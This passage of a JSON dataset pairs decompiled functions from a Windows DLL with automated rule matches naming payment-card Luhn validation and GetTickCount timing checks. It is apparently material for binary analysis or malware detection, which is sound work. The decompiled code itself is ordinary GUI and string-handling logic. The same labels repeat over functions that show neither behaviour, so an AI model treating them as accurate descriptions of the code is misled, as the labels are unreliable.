fcn.1800b3528();\ncode_r0x00018003d74b:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(puVar6);\n    }\n    fcn.18008fb00(uStack40 ^ auStack200);\n    return;\n}\n",
        "token_count": 914
    },
    "18003eeb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18003eeb0(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    uchar uVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    int64_t *piVar8;\n    ulong uVar9;\n    int64_t iVar10;\n    ushort *puVar11;\n    uchar *puVar12;\n    bool bVar13;\n    uchar auStack168 [32];\n    ulong uStack136;\n    ushort uStack120;\n    ushort uStack118;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int64_t iStack104;\n    uint64_t uStack96;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    ulong uStack80;\n    uint64_t uStack72;\n    uint uStack64;\n    uint uStack60;\n    ulong uStack56;\n    ushort *puStack48;\n    int64_t iStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    uStack80 = 0x18003eed5;\n    (**0x1800de7f0)(*(arg1 + 0x118), 0x180, 0, 0x1800f6b6c);\n    uStack80 = 0x18003eeed;\n    iVar6 = (**0x1800de7f0)(*(arg1 + 0x118), 0x18b, 0, 0);\n    uStack80 = 0x18003ef07;\n    (**0x1800de7f0)(*(arg1 + 0x118), 0x186, iVar6 + -1, 0);\n    uStack80 = 0x18003ef1d;\n    fcn.180010d70(arg1 + 0xd8, 0x1800f6c14, 0);\n    iVar10 = arg1 + 0xf8;\n    uStack80 = 0x18003ef33;\n    fcn.180010d70(iVar10, 0x1800f6ce4, 0);\n    uStack80 = 0x18003ef3d;\n    uVar9 = fcn.18003e0a0(iVar10, &stack0xffffffffffffffd8);\n    uStack80 = 0x18003ef4c;\n    fcn.18000dd60(arg1 + 0xb8, uVar9);\n    if (0xf < uStack16) {\n        iVar10 = iStack40;\n        if (0xfff < uStack16 + 1) {\n            iVar10 = *(iStack40 + -8);\n            if (0x1f < (iStack40 - iVar10) - 8U) {\n                uStack80 = 0x18003efaa;\n                fcn.1800b3528(iVar10, uStack16 + 0x28);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        uStack80 = 0x18003ef85;\n        fcn.18008fb24(iVar10);\n    }\n    uStack80 = 0x18003ef8d;\n    fcn.18003f1d0(arg1);\n    *(arg1 + 0x91) = 1;\n    *(arg1 + 0x30) = 0;\n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ &stack0xffffffffffffff58;\n    uVar2 = *(arg1 + 0x30);\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x264a);\n    (**0x1800de770)(uVar9, uVar2);\n    uVar2 = *(arg1 + 0x30);\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x264b);\n    (**0x1800de770)(uVar9, uVar2);\n    uVar2 = *(arg1 + 0x30);\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x264c);\n    (**0x1800de770)(uVar9, uVar2);\n    uStack32 = 0;\n    uStack24 = 7;\n    puStack48 = puStack48 & 0xffffffffffff0000;\n    puStack48 = fcn.180011cf0(&stack0xffffffffffffffd0, 0x108);\n    uStack32 = 0x105;\n    uStack24 = 0x107;\n    puVar11 = puStack48;\n    for (iVar10 = 0x105; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    puStack48[0x105] = 0;\n    (**0x1800de728)(*(arg1 + 0x18), 0x264f, puStack48, 0x105);\n    puVar11 = &stack0xffffffffffffffd0;\n    if (7 < uStack24) {\n        puVar11 = puStack48;\n    }\n    iStack104 = 0;\n    uStack96 = 7;\n    uStack120 = 0;\n    iVar10 = -1;\n    do {\n        iVar10 = iVar10 + 1;\n    } while (puVar11[iVar10] != 0);\n    fcn.180010d70(&stack0xffffffffffffff88, puVar11, iVar10);\n    bVar13 = iStack104 != 0;\n    uVar9 = (**0x1800de798)(*(arg1 + 0x18), 0x2660);\n    (**0x1800de770)(uVar9, bVar13);\n    if (uStack96 < 8) {\ncode_r0x00018003eca9:\n        if (*(arg1 + 0x30) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x2660, 0x1800f79d0);\n            fcn.180068540(*(arg1 + 0x18), 0x2660);\ncode_r0x00018003ee37:\n            if (uStack24 < 8) goto code_r0x00018003ee73;\n            puVar11 = puStack48;\n            if (0xfff < uStack24 * 2 + 2) {\n                puVar11 = *(puStack48 + -4);\n                if (0x1f < puStack48 + (-8 - puVar11)) {\n                    fcn.1800b3528(puVar11, uStack24 * 2 + 0x29);\n                    goto code_r0x00018003ee9e;\n                }\n            }\n            fcn.18008fb24(puVar11);\ncode_r0x00018003ee73:\n            fcn.18008fb00(uStack16 ^ &stack0xffffffffffffff58);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f79e0, 5);\n        uVar5 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            uStack136 = 1;\n            piVar8 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f69ec);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar7 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar7 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar7 + uVar5 * 2) = 0x2a;\n            *(puVar7 + uVar1 * 2) = 0;\n            piVar8 = &stack0xffffffffffffffa8;\n        }\n        uStack116 = *(piVar8 + 4);\n        puVar7 = *piVar8;\n        uStack112 = *(piVar8 + 1);\n        uStack108 = *(piVar8 + 0xc);\n        uStack120 = *piVar8;\n        uStack118 = *piVar8 >> 0x10;\n        iStack104 = piVar8[2];\n        uStack96 = piVar8[3];\n        piVar8[2] = 0;\n        piVar8[3] = 7;\n        *piVar8 = 0;\n        puVar12 = &stack0xffffffffffffff88;\n        if (7 < uStack96) {\n            puVar12 = puVar7;\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x2660, puVar12);\n        if (uStack96 < 8) {\ncode_r0x00018003edd7:\n            iStack104 = CONCAT44(*0x180101904, *0x180101900);\n            uStack96 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack120 = 0;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                iVar4 = CONCAT62(Stack86, uStack88);\n                iVar10 = iVar4;\n                if ((0xfff < CONCAT44(uStack60, uStack64) * 2 + 2) &&\n                   (iVar10 = *(iVar4 + -8),  0x1f < (iVar4 - iVar10) - 8U)) goto code_r0x00018003eeaa;\n                fcn.18008fb24(iVar10);\n            }\n            fcn.180068600(*(arg1 + 0x18), 0x2660);\n            goto code_r0x00018003ee37;\n        }\n        iVar4 = CONCAT44(uStack116, CONCAT22(uStack118, uStack120));\n        iVar10 = iVar4;\n        if ((uStack96 * 2 + 2 < 0x1000) || (iVar10 = *(iVar4 + -8),  (iVar4 - iVar10) - 8U < 0x20)) {\n            fcn.18008fb24(iVar10);\n            goto code_r0x00018003edd7;\n        }\n    }\n    else {\n        iVar4 = CONCAT44(uStack116, CONCAT22(uStack118, uStack120));\n        iVar10 = iVar4;\n        if ((uStack96 * 2 + 2 < 0x1000) || (iVar10 = *(iVar4 + -8),  (iVar4 - iVar10) - 8U < 0x20)) {\n            fcn.18008fb24(iVar10);\n            goto code_r0x00018003eca9;\n        }\ncode_r0x00018003ee9e:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018003eeaa:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 2580
    },
    "18003f1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18003f1d0(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    uchar uVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uchar *puVar6;\n    int64_t *piVar7;\n    ulong uVar8;\n    int64_t iVar9;\n    ushort *puVar10;\n    uchar *puVar11;\n    bool bVar12;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar extraout_XMM0_01 [16];\n    uchar auStack168 [32];\n    ulong uStack136;\n    ushort uStack120;\n    ushort uStack118;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int64_t iStack104;\n    uint64_t uStack96;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    ulong uStack80;\n    uint64_t uStack72;\n    uint uStack64;\n    uint uStack60;\n    ulong uStack56;\n    ushort *puStack48;\n    uchar auStack40 [16];\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    piVar7 = arg1 + 0xd8;\n    *(arg1 + 0x90) = 1;\n    if (7 < *(arg1 + 0xf0)) {\n        piVar7 = *piVar7;\n    }\n    iVar9 = *(arg1 + 0x18);\n    uStack80 = 0x18003f200;\n    (**0x1800de788)(iVar9, 0x264f, piVar7);\n    *(arg1 + 0x90) = 0;\n    auStack40 = extraout_XMM0;\n    if (*(arg1 + 200) != 0x10) {\n        uStack80 = 0x18003f21b;\n        uVar8 = fcn.18003e0a0(iVar9, &stack0xffffffffffffffd8);\n        iVar9 = arg1 + 0xb8;\n        uStack80 = 0x18003f22a;\n        fcn.18000dd60(iVar9, uVar8);\n        auStack40 = extraout_XMM0_00;\n        if (0xf < uStack16) {\n            iVar9 = auStack40._0_8_;\n            if (0xfff < uStack16 + 1) {\n                iVar9 = *(auStack40._0_8_ + -8);\n                if (0x1f < (auStack40._0_8_ - iVar9) - 8U) {\n                    uStack80 = 0x18003f308;\n                    fcn.1800b3528(iVar9, uStack16 + 0x28);\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n            }\n            uStack80 = 0x18003f267;\n            fcn.18008fb24(iVar9);\n            auStack40 = extraout_XMM0_01;\n        }\n    }\n    auStack40 = auStack40 & 0x0;\n    uStack80 = 0x18003f28b;\n    fcn.180006040(iVar9, arg1 + 0xb8, &stack0xffffffffffffffd8);\n    uStack80 = 0x18003f2a7;\n    (**0x1800de758)(*(arg1 + 0x38), 0x2718);\n    uStack80 = 0x18003f2c0;\n    (**0x1800de758)(*(arg1 + 0x38));\n    uVar8 = 0;\n    uStack80 = 0x18003f2d5;\n    fcn.18004b660(arg1 + 0x30, 1, auStack40._0_4_);\n    uStack80 = 0x18003f2e8;\n    fcn.18004b660(arg1 + 0x30, CONCAT71(uVar8 >> 8, 1), auStack40._4_4_);\n    *(arg1 + 0x30) = 1;\n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ &stack0xffffffffffffff58;\n    uVar2 = *(arg1 + 0x30);\n    uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x264a);\n    (**0x1800de770)(uVar8, uVar2);\n    uVar2 = *(arg1 + 0x30);\n    uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x264b);\n    (**0x1800de770)(uVar8, uVar2);\n    uVar2 = *(arg1 + 0x30);\n    uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x264c);\n    (**0x1800de770)(uVar8, uVar2);\n    auStack40 = auStack40 & 0xffffffffffffffff;\n    uStack24 = 7;\n    puStack48 = puStack48 & 0xffffffffffff0000;\n    puStack48 = fcn.180011cf0(&stack0xffffffffffffffd0, 0x108);\n    auStack40 = CONCAT88(0x105, auStack40._0_8_);\n    uStack24 = 0x107;\n    puVar10 = puStack48;\n    for (iVar9 = 0x105; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puStack48[0x105] = 0;\n    (**0x1800de728)(*(arg1 + 0x18), 0x264f, puStack48, 0x105);\n    puVar10 = &stack0xffffffffffffffd0;\n    if (7 < uStack24) {\n        puVar10 = puStack48;\n    }\n    iStack104 = 0;\n    uStack96 = 7;\n    uStack120 = 0;\n    iVar9 = -1;\n    do {\n        iVar9 = iVar9 + 1;\n    } while (puVar10[iVar9] != 0);\n    fcn.180010d70(&stack0xffffffffffffff88, puVar10, iVar9);\n    bVar12 = iStack104 != 0;\n    uVar8 = (**0x1800de798)(*(arg1 + 0x18), 0x2660);\n    (**0x1800de770)(uVar8, bVar12);\n    if (uStack96 < 8) {\ncode_r0x00018003eca9:\n        if (*(arg1 + 0x30) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x2660, 0x1800f79d0);\n            fcn.180068540(*(arg1 + 0x18), 0x2660);\ncode_r0x00018003ee37:\n            if (uStack24 < 8) goto code_r0x00018003ee73;\n            puVar10 = puStack48;\n            if (0xfff < uStack24 * 2 + 2) {\n                puVar10 = *(puStack48 + -4);\n                if (0x1f < puStack48 + (-8 - puVar10)) {\n                    fcn.1800b3528(puVar10, uStack24 * 2 + 0x29);\n                    goto code_r0x00018003ee9e;\n                }\n            }\n            fcn.18008fb24(puVar10);\ncode_r0x00018003ee73:\n            fcn.18008fb00(uStack16 ^ &stack0xffffffffffffff58);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        fcn.180010d70(&stack0xffffffffffffffa8, 0x1800f79e0, 5);\n        uVar5 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            uStack136 = 1;\n            piVar7 = fcn.180013690(&stack0xffffffffffffffa8, 1, 0, 0x1800f69ec);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar6 = &stack0xffffffffffffffa8;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar6 = CONCAT62(Stack86, uStack88);\n            }\n            *(puVar6 + uVar5 * 2) = 0x2a;\n            *(puVar6 + uVar1 * 2) = 0;\n            piVar7 = &stack0xffffffffffffffa8;\n        }\n        uStack116 = *(piVar7 + 4);\n        puVar6 = *piVar7;\n        uStack112 = *(piVar7 + 1);\n        uStack108 = *(piVar7 + 0xc);\n        uStack120 = *piVar7;\n        uStack118 = *piVar7 >> 0x10;\n        iStack104 = piVar7[2];\n        uStack96 = piVar7[3];\n        piVar7[2] = 0;\n        piVar7[3] = 7;\n        *piVar7 = 0;\n        puVar11 = &stack0xffffffffffffff88;\n        if (7 < uStack96) {\n            puVar11 = puVar6;\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x2660, puVar11);\n        if (uStack96 < 8) {\ncode_r0x00018003edd7:\n            iStack104 = CONCAT44(*0x180101904, *0x180101900);\n            uStack96 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack120 = 0;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                iVar4 = CONCAT62(Stack86, uStack88);\n                iVar9 = iVar4;\n                if ((0xfff < CONCAT44(uStack60, uStack64) * 2 + 2) &&\n                   (iVar9 = *(iVar4 + -8),  0x1f < (iVar4 - iVar9) - 8U)) goto code_r0x00018003eeaa;\n                fcn.18008fb24(iVar9);\n            }\n            fcn.180068600(*(arg1 + 0x18), 0x2660);\n            goto code_r0x00018003ee37;\n        }\n        iVar4 = CONCAT44(uStack116, CONCAT22(uStack118, uStack120));\n        iVar9 = iVar4;\n        if ((uStack96 * 2 + 2 < 0x1000) || (iVar9 = *(iVar4 + -8),  (iVar4 - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            goto code_r0x00018003edd7;\n        }\n    }\n    else {\n        iVar4 = CONCAT44(uStack116, CONCAT22(uStack118, uStack120));\n        iVar9 = iVar4;\n        if ((uStack96 * 2 + 2 < 0x1000) || (iVar9 = *(iVar4 + -8),  (iVar4 - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            goto code_r0x00018003eca9;\n        }\ncode_r0x00018003ee9e:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018003eeaa:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 2768
    },
    "180042e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180042e30(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    if (7 < arg1[7]) {\n        iVar3 = arg1[4];\n        iVar5 = arg1[7] * 2;\n        iVar4 = iVar3;\n        if (0xfff < iVar5 + 2U) {\n            iVar4 = *(iVar3 + -8);\n            iVar5 = iVar5 + 0x29;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x000180042edb;\n        }\n        fcn.18008fb24(iVar4);\n    }\n    arg1[7] = 7;\n    arg1[6] = 0;\n    *(arg1 + 4) = 0;\n    uVar1 = arg1[3];\n    if (0xf < uVar1) {\n        iVar3 = *arg1;\n        iVar4 = iVar3;\n        if (0xfff < uVar1 + 1) {\n            iVar4 = *(iVar3 + -8);\n            iVar5 = uVar1 + 0x28;\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) {\ncode_r0x000180042edb:\n                fcn.1800b3528(iVar3, iVar5);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar4);\n    }\n    arg1[2] = 0;\n    arg1[3] = 0xf;\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 409
    },
    "180042f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180042f10(int64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    \n    piVar3 = arg2 + 0x20;\n    *(arg1 + 0x50) = 1;\n    if (7 < *(arg2 + 0x38)) {\n        piVar3 = *piVar3;\n    }\n    iVar2 = (**0x1800de7f0)(*(arg1 + 0x60), 0x14c, 0xffffffffffffffff, piVar3);\n    uVar1 = *(arg1 + 0x60);\n    (**0x1800de7f0)(uVar1, 0x14e, iVar2, 0);\n    (**0x1800de5b8)(uVar1, 0, 0);\n    (**0x1800de758)(*(arg1 + 0x18), 0x27df, *(arg2 + 0x40) != '\\0');\n    *(arg1 + 0x50) = 0;\n    return;\n}\n",
        "token_count": 254
    },
    "1800435d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.1800435d0(ulong *arg1, ulong *arg2)\n\n{\n    ulong *arg2_00;\n    int64_t *arg2_01;\n    \n    if (arg1 != arg2) {\n        arg2_00 = arg2;\n        if (0xf < arg2[3]) {\n            arg2_00 = *arg2;\n        }\n        fcn.180011120(arg1, arg2_00, arg2[2]);\n    }\n    arg2_01 = arg2 + 4;\n    if (arg1 + 4 != arg2_01) {\n        if (7 < arg2[7]) {\n            arg2_01 = *arg2_01;\n        }\n        fcn.180010d70(arg1 + 4, arg2_01, arg2[6]);\n    }\n    *(arg1 + 8) = *(arg2 + 8);\n    if (arg1 + 9 != arg2 + 9) {\n        fcn.180049d40(arg1 + 9, arg2[9], arg2[10]);\n    }\n    return arg1;\n}\n",
        "token_count": 249
    },
    "180043fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180043fe0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t *arg1_00;\n    int64_t arg2_00;\n    int64_t arg2_01;\n    uchar auStack120 [32];\n    int64_t *piStack88;\n    ulong uStack80;\n    int64_t *piStack72;\n    int64_t iStack64;\n    uchar auStack56 [16];\n    int64_t *piStack40;\n    uint64_t uStack32;\n    \n    uStack80 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack120;\n    piStack88 = arg1;\n    piStack72 = arg1;\n    fcn.18000de50(arg1, arg2);\n    arg1_00 = arg1 + 4;\n    fcn.18000da90(arg1_00, arg2 + 0x20);\n    *(arg1 + 8) = *(arg2 + 0x40);\n    *(arg1 + 0x44) = *(arg2 + 0x44);\n    piVar1 = arg1 + 9;\n    *piVar1 = 0;\n    arg1[10] = 0;\n    arg1[0xb] = 0;\n    arg2_00 = *(arg2 + 0x48);\n    iVar2 = *(arg2 + 0x50);\n    if (arg2_00 != iVar2) {\n        arg2_01 = iVar2 - arg2_00 >> 6;\n        iVar3 = fcn.180049020(arg1_00, arg2_01);\n        *piVar1 = iVar3;\n        arg1[10] = iVar3;\n        arg1[0xb] = arg2_01 * 0x40 + iVar3;\n        iVar3 = *piVar1;\n        auStack56 = CONCAT88(iVar3, iVar3);\n        piStack88 = piVar1;\n        piStack40 = piVar1;\n        do {\n            iStack64 = iVar3;\n            fcn.18000de50(iVar3, arg2_00);\n            fcn.18000da90(iVar3 + 0x20, arg2_00 + 0x20);\n            iVar3 = iVar3 + 0x40;\n            auStack56 = CONCAT88(iVar3, auStack56._0_8_);\n            arg2_00 = arg2_00 + 0x40;\n        } while (arg2_00 != iVar2);\n        arg1[10] = iVar3;\n    }\n    fcn.18008fb00(uStack32 ^ auStack120);\n    return;\n}\n",
        "token_count": 623
    },
    "18004424": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180044240(int64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong *puVar4;\n    int64_t arg1_00;\n    int64_t *piVar5;\n    int64_t aiStack40 [3];\n    uint64_t uStack16;\n    \n    piVar5 = arg2 + 0x20;\n    *(arg1 + 0x50) = 1;\n    if (7 < *(arg2 + 0x38)) {\n        piVar5 = *piVar5;\n    }\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x70), 0x14c, 0xffffffffffffffff, piVar5);\n    uVar1 = *(arg1 + 0x70);\n    (**0x1800de7f0)(uVar1, 0x14e, iVar3, 0);\n    (**0x1800de5b8)(uVar1, 0, 0);\n    puVar4 = fcn.180020b50(aiStack40, *(arg2 + 0x40));\n    if (7 < puVar4[3]) {\n        puVar4 = *puVar4;\n    }\n    (**0x1800de788)(*(arg1 + 0x18), 0x27f4, puVar4);\n    if (7 < uStack16) {\n        arg1_00 = aiStack40[0];\n        if (0xfff < uStack16 * 2 + 2) {\n            arg1_00 = *(aiStack40[0] + -8);\n            if (0x1f < (aiStack40[0] - arg1_00) - 8U) {\n                fcn.1800b3528(arg1_00, uStack16 * 2 + 0x29);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    (**0x1800de758)(*(arg1 + 0x18), 0x27f5, *(arg2 + 0x44) != '\\0');\n    *(arg1 + 0x50) = 0;\n    return;\n}\n",
        "token_count": 520
    },
    "1800451b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1800451b0(int64_t arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    int64_t iVar3;\n    int64_t arg2_00;\n    int64_t iVar4;\n    ushort *puVar5;\n    uchar auStack152 [32];\n    ulong uStack120;\n    int64_t aiStack104 [3];\n    uint64_t uStack80;\n    ushort uStack72;\n    unkbyte6 Stack70;\n    ulong uStack56;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    \n    uStack120 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack152;\n    (**0x1800de7f0)(*(arg1 + 0x80), 0x184, 0, 0);\n    arg2_00 = *(arg2 + 0x48);\n    iVar4 = *(arg2 + 0x50);\n    if (arg2_00 != iVar4) {\n        do {\n            fcn.18000de50(aiStack104, arg2_00);\n            fcn.18000da90(&uStack72, arg2_00 + 0x20);\n            puVar5 = &uStack72;\n            if (7 < uStack48) {\n                puVar5 = CONCAT62(Stack70, uStack72);\n            }\n            (**0x1800de7f0)(*(arg1 + 0x80), 0x180, 0, puVar5);\n            if (7 < uStack48) {\n                iVar2 = CONCAT62(Stack70, uStack72);\n                arg1_00 = iVar2;\n                if (0xfff < uStack48 * 2 + 2) {\n                    iVar3 = uStack48 * 2 + 0x29;\n                    arg1_00 = *(iVar2 + -8);\n                    if (0x1f < (iVar2 - arg1_00) - 8U) goto code_r0x000180045359;\n                }\n                fcn.18008fb24(arg1_00);\n            }\n            uStack56 = 0;\n            uStack48 = 7;\n            uStack72 = 0;\n            if (0xf < uStack80) {\n                arg1_00 = aiStack104[0];\n                if (0xfff < uStack80 + 1) {\n                    iVar3 = uStack80 + 0x28;\n                    arg1_00 = *(aiStack104[0] + -8);\n                    if (0x1f < (aiStack104[0] - arg1_00) - 8U) {\ncode_r0x000180045359:\n                        fcn.1800b3528(arg1_00, iVar3);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n            }\n            arg2_00 = arg2_00 + 0x40;\n        } while (arg2_00 != iVar4);\n        iVar4 = *(arg2 + 0x50);\n    }\n    if ((iVar4 - *(arg2 + 0x48) & 0xffffffffffffffc0U) != 0) {\n        (**0x1800de7f0)(*(arg1 + 0x80), 0x186, 0, 0);\n    }\n    fcn.180045360(arg1);\n    fcn.1800455a0(arg1);\n    *(arg1 + 0x54) = 1;\n    fcn.180044430(arg1);\n    fcn.18008fb00(uStack40 ^ auStack152);\n    return;\n}\n",
        "token_count": 833
    },
    "1800455a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800455a0(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    char cVar2;\n    bool bVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    ulong uVar10;\n    ulong uVar11;\n    ulong uVar12;\n    uint uVar13;\n    char cVar14;\n    uchar *puVar15;\n    uchar *puVar16;\n    uchar *puVar17;\n    ushort uStack88;\n    unkbyte6 Stack86;\n    ulong uStack80;\n    uint64_t uStack72;\n    uint64_t uStack64;\n    ushort uStack56;\n    ushort uStack54;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint64_t uVar18;\n    \n    cVar14 = *(arg1 + 0x54);\n    uStack80 = 0x1800455d9;\n    iVar8 = (**0x1800de7f0)(*(arg1 + 0x68), 0x18b, 0, 0);\n    uStack80 = 0x1800455f8;\n    iVar9 = (**0x1800de7f0)(*(arg1 + 0x80), 0x18b, 0, 0);\n    cVar2 = *(arg1 + 0x54);\n    bVar3 = 0 < iVar9;\n    iVar9 = *(arg1 + 0xb0) - *(arg1 + 0xa8) >> 6;\n    uStack80 = 0x18004562b;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x2809);\n    uStack80 = 0x180045636;\n    (**0x1800de718)(uVar10, -(cVar2 != '\\0') & 5);\n    uVar13 = 5;\n    if (*(arg1 + 0x54) != '\\0') {\n        uVar13 = 0;\n    }\n    uStack80 = 0x180045655;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x2808);\n    uStack80 = 0x180045660;\n    (**0x1800de718)(uVar10, uVar13);\n    uStack80 = 0x180045670;\n    (**0x1800de770)(*(arg1 + 0x80), cVar14);\n    uVar10 = 1;\n    if ((!bVar3) || (uVar12 = uVar10,  iVar9 == 0)) {\n        uVar12 = 0;\n    }\n    uStack80 = 0x180045690;\n    (**0x1800de770)(*(arg1 + 0x88), uVar12);\n    if ((!bVar3) || (uVar12 = uVar10,  iVar9 == 0)) {\n        uVar12 = 0;\n    }\n    uStack80 = 0x1800456ae;\n    uVar11 = (**0x1800de798)(*(arg1 + 0x18), 0x2807);\n    uStack80 = 0x1800456b9;\n    (**0x1800de770)(uVar11, uVar12);\n    if (((iVar8 < 1) || (iVar9 == 0)) || (cVar14 == '\\0')) {\n        uVar10 = 0;\n    }\n    uStack80 = 0x1800456da;\n    uVar12 = (**0x1800de798)(*(arg1 + 0x18), 0x2809);\n    uStack80 = 0x1800456e5;\n    (**0x1800de770)(uVar12, uVar10);\n    uStack80 = 0x1800456f8;\n    uVar10 = (**0x1800de798)(*(arg1 + 0x18), 0x280a);\n    uStack80 = 